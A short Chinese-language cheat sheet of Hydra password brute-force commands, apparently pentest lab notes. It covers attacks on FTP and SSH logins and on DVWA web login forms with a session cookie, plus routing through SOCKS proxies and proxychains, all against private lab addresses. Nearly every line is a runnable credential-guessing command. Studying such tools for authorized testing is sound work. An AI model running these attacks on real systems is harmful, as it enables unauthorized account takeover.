	猜测指定用户名的密码
	> hydra -l username -P pass.txt 192.168.1.141 ftp
	猜测指定密码的用户名
	> hydra -L users.txt -p 123 192.168.1.141 ftp
	爆破用户名和密码
	> hydra -L users.txt -P pass.txt 192.168.1.141 ftp
	详细模式加-V 调试模式加-d
	-e nsr参数
	n代表null ,s代表same相同，r代表字符反转,如admin对应nimda
	-o result.txt 代表保存结果到文件
	-R 由于某些原因停止了爆破
	> hydra -R 可以恢复爆破
	针对特定端口
	> hydra -L users.txt -P pass.txt 192.168.1.141 ssh -s 2222
	针对多台机器
	> hydra -L users.txt -P pass.txt -M hosts.txt ftp
	添加-F 参数，当爆破出一个结果时停止爆破
	表单爆破
	> hydra -l admin -P pass.txt 192.168.1.150 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
	加入cookie
	> hydra 192.168.1.150 -l admin -P 'pass.txt' http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low"
	代理支持
	> export HYDRA_PROXY=socks5://192.168.1.141:1080
	> hydra -l username -P pass.txt 192.168.1.141 ftp
	proxychains
	编辑/etc/proxychains4.conf后执行
	> proxychains hydra -l ignite -P pass.txt 192.168.1.141 ftp